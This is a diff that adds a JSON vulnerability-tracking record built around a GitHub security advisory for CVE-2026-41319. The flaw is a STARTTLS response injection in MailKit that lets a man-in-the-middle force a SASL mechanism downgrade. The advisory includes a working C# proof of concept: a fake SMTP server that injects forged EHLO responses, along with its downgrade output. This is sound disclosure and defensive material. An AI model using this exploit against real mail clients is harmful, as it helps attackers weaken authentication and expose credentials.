@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/161985512?v=4\", \"events_url\": \"https://api.github.com/users/ROCmertakdag/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ROCmertakdag/followers\", \"following_url\": \"https://api.github.com/users/ROCmertakdag/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ROCmertakdag/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ROCmertakdag\", \"id\": 161985512, \"login\": \"ROCmertakdag\", \"node_id\": \"U_kgDOCaez6A\", \"organizations_url\": \"https://api.github.com/users/ROCmertakdag/orgs\", \"received_events_url\": \"https://api.github.com/users/ROCmertakdag/received_events\", \"repos_url\": \"https://api.github.com/users/ROCmertakdag/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ROCmertakdag/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ROCmertakdag/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ROCmertakdag\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41319\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-74\", \"name\": \"Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\"}], \"description\": \"### Summary\\n\\nA STARTTLS Response Injection vulnerability in MailKit allows a Man-in-the-Middle attacker to inject arbitrary protocol responses across the plaintext-to-TLS trust boundary, enabling SASL authentication mechanism downgrade (e.g., forcing PLAIN instead of SCRAM-SHA-256). The internal read buffer in `SmtpStream`, `ImapStream`, and `Pop3Stream` is not flushed when the underlying stream is replaced with `SslStream` during STARTTLS upgrade, causing pre-TLS attacker-injected data to be processed as trusted post-TLS responses. This is the same vulnerability class as CVE-2021-23993 (Thunderbird), CVE-2021-33515 (Dovecot), and CVE-2011-0411 (Postfix).\\n\\n### Details\\n\\nThe `Stream` property in `SmtpStream` (line 84-86), `ImapStream`, and `Pop3Stream` is a simple auto-property with no buffer reset:\\n\\n```csharp\\npublic Stream Stream {\\n    get; internal set;  // ← No buffer reset on set!\\n}\\n```\\n\\nDuring the STARTTLS upgrade in `SmtpClient.cs` (lines 1372-1389):\\n\\n```csharp\\n// Reads STARTTLS response — \\\"220 Ready\\\" consumed, any extra data stays in buffer\\nresponse = Stream.SendCommand(\\\"STARTTLS\\\\r\\\\n\\\", cancellationToken);\\n\\n// Swaps to TLS — buffer NOT flushed!\\nvar tls = new SslStream(stream, false, ValidateRemoteCertificate);\\nStream.Stream = tls;\\nSslHandshake(tls, host, cancellationToken);\\n\\n// Reads EHLO response — processes INJECTED pre-TLS data from buffer first!\\nEhlo(true, cancellationToken);\\n```\\n\\nA MitM appends extra data after the `\\\"220 Ready\\\\r\\\\n\\\"` STARTTLS response. Both arrive in one TCP read into `SmtpStream`'s 4096-byte internal buffer. `ReadResponse()` parses `\\\"220 Ready\\\"` and stops — the injected data remains at `inputIndex`. After `Stream.Stream = tls`, the buffer is not cleared. When `Ehlo()` calls `ReadResponse()`, it checks `inputIndex == inputEnd` — this is FALSE (injected data exists), so it processes the buffered pre-TLS data without reading from the new TLS stream.\\n\\nThe same pattern exists in `ImapClient.cs` (lines 1485-1509) and `Pop3Client.cs`.\\n\\n**Attack flow:**\\n```\\nClient                    MitM                     Real Server\\n  |--- STARTTLS ---------->|--- STARTTLS ----------->|\\n  |                        |<-- 220 Ready -----------|\\n  |<-- \\\"220 Ready\\\\r\\\\n\\\"-----|                         |\\n  |    \\\"250-evil\\\\r\\\\n\\\"       |  ← INJECTED            |\\n  |    \\\"250 AUTH PLAIN\\\\r\\\\n\\\" |  ← INJECTED            |\\n  |    \\\"250 OK\\\\r\\\\n\\\"         |  ← INJECTED            |\\n  |===== TLS HANDSHAKE ====|==== PASSES THROUGH =====|\\n  |--- EHLO (over TLS) --->|                         |\\n  | Reads from BUFFER:     |                         |\\n  | \\\"250 AUTH PLAIN\\\"       |  ← PRE-TLS DATA        |\\n  | PROCESSED AS POST-TLS! |                         |\\n```\\n\\n**Suggested fix:** Reset buffer indices when the stream is replaced:\\n```csharp\\ninternal set { stream = value; inputIndex = inputEnd; }\\n```\\n\\n### PoC\\n\\nSelf-contained C# PoC — creates a fake SMTP server that injects a crafted EHLO response into the STARTTLS reply:\\n\\n```csharp\\nusing System; using System.Net; using System.Net.Security; using System.Net.Sockets;\\nusing System.Security.Cryptography; using System.Security.Cryptography.X509Certificates;\\nusing System.Text; using System.Threading; using System.Threading.Tasks;\\nusing MailKit.Net.Smtp; using MailKit.Security;\\n\\nclass PoC {\\n    static void Main() {\\n        using var rsa = RSA.Create(2048);\\n        var req = new CertificateRequest(\\\"CN=test\\\", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);\\n        var cert = new X509Certificate2(req.CreateSelfSigned(\\n            DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365)).Export(X509ContentType.Pfx));\\n\\n        var listener = new TcpListener(IPAddress.Loopback, 0);\\n        listener.Start();\\n        int port = ((IPEndPoint)listener.LocalEndpoint).Port;\\n\\n        Task.Run(() => {\\n            using var tcp = listener.AcceptTcpClient();\\n            var s = tcp.GetStream();\\n            Send(s, \\\"220 evil.example.com ESMTP\\\\r\\\\n\\\");\\n            Read(s);\\n            Send(s, \\\"250-evil.example.com\\\\r\\\\n250-STARTTLS\\\\r\\\\n250-AUTH SCRAM-SHA-256\\\\r\\\\n250 OK\\\\r\\\\n\\\");\\n            Read(s);\\n            // ATTACK: inject fake EHLO response after \\\"220 Ready\\\"\\n            Send(s, \\\"220 Ready\\\\r\\\\n250-evil.example.com\\\\r\\\\n250-AUTH PLAIN LOGIN\\\\r\\\\n250 OK\\\\r\\\\n\\\");\\n            var ssl = new SslStream(s, false);\\n            ssl.AuthenticateAsServer(cert, false, false);\\n            ReadSsl(ssl);\\n            SendSsl(ssl, \\\"250-evil.example.com\\\\r\\\\n250-AUTH SCRAM-SHA-256\\\\r\\\\n250 OK\\\\r\\\\n\\\");\\n            Thread.Sleep(2000);\\n        });\\n\\n        using var client = new SmtpClient();\\n        client.ServerCertificateValidationCallback = (a, b, c, d) => true;\\n        client.Connect(\\\"127.0.0.1\\\", port, SecureSocketOptions.StartTls);\\n        Console.WriteLine($\\\"Auth mechanisms: {string.Join(\\\", \\\", client.AuthenticationMechanisms)}\\\");\\n        // OUTPUT: \\\"Auth mechanisms: PLAIN, LOGIN\\\"\\n        // Server advertised SCRAM-SHA-256 — DOWNGRADE CONFIRMED\\n        client.Disconnect(false); listener.Stop();\\n    }\\n    static void Send(NetworkStream s, string d) { s.Write(Encoding.ASCII.GetBytes(d)); s.Flush(); }\\n    static string Read(NetworkStream s) { var b = new byte[4096]; return Encoding.ASCII.GetString(b, 0, s.Read(b)); }\\n    static void SendSsl(SslStream s, string d) { s.Write(Encoding.ASCII.GetBytes(d)); s.Flush(); }\\n    static string ReadSsl(SslStream s) { var b = new byte[4096]; return Encoding.ASCII.GetString(b, 0, s.Read(b)); }\\n}\\n```\\n\\n**Result against MailKit 4.12.0:**\\n```\\nAuth mechanisms: PLAIN, LOGIN\\n(Real server advertised SCRAM-SHA-256 — SASL mechanism DOWNGRADE achieved)\\n```\\n\\n### Impact\\n\\nAny application using MailKit with `SecureSocketOptions.StartTls` or `StartTlsWhenAvailable` (the default) is vulnerable. A network Man-in-the-Middle attacker can inject arbitrary SMTP/IMAP/POP3 responses that cross the plaintext-to-TLS trust boundary, enabling SASL authentication mechanism downgrade and capability manipulation. All three protocols (SMTP, IMAP, POP3) share the same vulnerable pattern. All MailKit versions through 4.12.0 are affected.\", \"epss\": {\"percentage\": 0.00223, \"percentile\": 0.12664}, \"ghsa_id\": \"GHSA-9j88-vvj5-vhgr\", \"github_reviewed_at\": \"2026-04-18T01:13:46Z\", \"html_url\": \"https://github.com/advisories/GHSA-9j88-vvj5-vhgr\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9j88-vvj5-vhgr\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41319\"}], \"nvd_published_at\": \"2026-04-24T04:16:20Z\", \"published_at\": \"2026-04-18T01:13:46Z\", \"references\": [\"https://github.com/jstedfast/MailKit/security/advisories/GHSA-9j88-vvj5-vhgr\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41319\", \"https://github.com/advisories/GHSA-9j88-vvj5-vhgr\"], \"repository_advisory_url\": \"https://api.github.com/repos/jstedfast/MailKit/security-advisories/GHSA-9j88-vvj5-vhgr\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/jstedfast/MailKit\", \"summary\": \"MailKit has STARTTLS Response Injection via unflushed stream buffer that enables SASL mechanism downgrade\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-24T21:02:08Z\", \"url\": \"https://api.github.com/advisories/GHSA-9j88-vvj5-vhgr\", \"vulnerabilities\": [{\"first_patched_version\": \"4.16.0\", \"package\": {\"ecosystem\": \"nuget\", \"name\": \"MailKit\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.16.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9j88-vvj5-vhgr",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "MailKit: < 4.16.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2011-0411",
+      "CVE-2021-23993",
+      "CVE-2021-33515",
+      "CVE-2026-41319"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "MailKit"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.603314Z",
+  "provenance": {
+    "content_sha256": "2fe58e3001ffab3c2bbbf14b88c8d32fe6335870098d99520e736c39d9689565",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-18T01:13:46Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9j88-vvj5-vhgr",
+  "status": "active",
+  "title": "MailKit has STARTTLS Response Injection via unflushed stream buffer that enables SASL mechanism downgrade",
+  "updated_at": "2026-04-24T21:02:08Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9j88-vvj5-vhgr"
+}
